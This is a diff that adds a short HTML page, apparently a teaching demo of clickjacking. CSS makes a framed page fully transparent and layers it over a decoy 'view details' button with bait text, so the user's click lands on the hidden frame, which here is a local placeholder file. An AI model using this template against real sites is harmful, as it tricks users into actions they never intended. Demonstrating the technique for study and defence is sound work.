@@ -1,0 +1,36 @@
+<!DOCTYPE HTML>
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<head>
+<title>点击劫持</title>
+<style>
+     html,body,iframe{
+         display: block;
+          height: 100%;
+          width: 100%;
+          margin: 0;
+          padding: 0;
+          border:none;
+     }
+     iframe{
+          opacity:0;
+          filter:alpha(opacity=0);
+          position:absolute;
+          z-index:2;
+     }
+     button{
+          position:absolute;
+          top: 315px;
+          left: 462px;
+          z-index: 1;
+          width: 72px;
+          height: 26px;
+     }
+</style>
+</head>
+     <body>
+          那些不能说的秘密
+          <button>查看详细</button>
+          <iframe src="iframe-content.html"></iframe>
+     </body>
+</html>
